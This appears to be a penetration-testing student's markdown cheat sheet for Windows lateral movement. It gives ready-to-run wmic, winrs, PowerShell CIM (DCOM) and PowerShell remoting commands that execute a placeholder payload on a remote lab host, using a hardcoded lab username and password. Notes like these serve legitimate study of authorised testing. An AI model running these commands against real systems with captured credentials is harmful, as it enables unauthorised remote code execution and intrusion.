# Native wmic
```bash
wmic /node:192.168.250.73 /user:jen /password:Nexus123! process call create "<payload>"
```

-----------------------

# Powershell wmic
```bash
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.250.73 -Credential $credential -SessionOption $Options
$Command = '<payload>';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

-----------------------

# Native winrs
```bash
winrs -r:files04 -u:jen -p:Nexus123! "<payload>"
```

-----------------------

# Powershellwinrs
```bash
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName 192.168.250.73 -Credential $credential
Enter-PSSession 1
```

